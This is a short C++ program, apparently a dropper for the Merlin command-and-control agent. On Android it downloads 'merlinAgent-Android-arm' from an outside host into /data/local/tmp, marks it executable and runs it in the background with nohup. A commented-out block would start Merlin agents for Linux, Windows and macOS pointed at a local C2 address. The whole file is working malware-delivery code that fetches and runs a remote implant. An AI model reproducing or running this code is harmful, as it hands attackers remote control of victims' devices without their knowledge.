#include <string>
#include <iostream>
#include "curl/curl.h"

using namespace std; 

string get_os_name() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __APPLE__
    return "Apple";
    #elif __ANDROID__
    return "Android";
    #elif __linux__
    return "Linux";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void download_file(string url, string location) {
    CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;

    if (curl) {
        fp = fopen(location.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

int main() {
    string os_name = get_os_name();
    cout << os_name << endl;

    if (os_name == "Android") {
        string merlin = "/data/local/tmp/merlin";

        download_file("http://cs4001.root.sx/android/merlinAgent-Android-arm", merlin);
        system(("chmod +x " + merlin).c_str());
        system(("cd /data/local/tmp && nohup " + merlin + " &").c_str());
    } else {
        cout << "Architecture not supported" << endl;
    }

    /*if(OSName == "Unix" || OSName == "Linux" || OSName == "Android") {
        system("./merlinAgent-Linux-x64 -url \"https://127.0.0.1:443\"");
    }
    else if(OSName == ("Windows 64-bit")) {
        system("./merlinAgent-Windows-x64 -url \"https://127.0.0.1:443\"");
    }
    else if(OSName == ("Windows 32-bit")) {
        system("./merlinAgent-Windows-x86 -url \"https://127.0.0.1:443\"");
    }
    else if(OSName == ("Apple")) {
        system("./merlinAgent-MacOS -url \"https://127.0.0.1:443\"");
    }*/

    return 0;
}
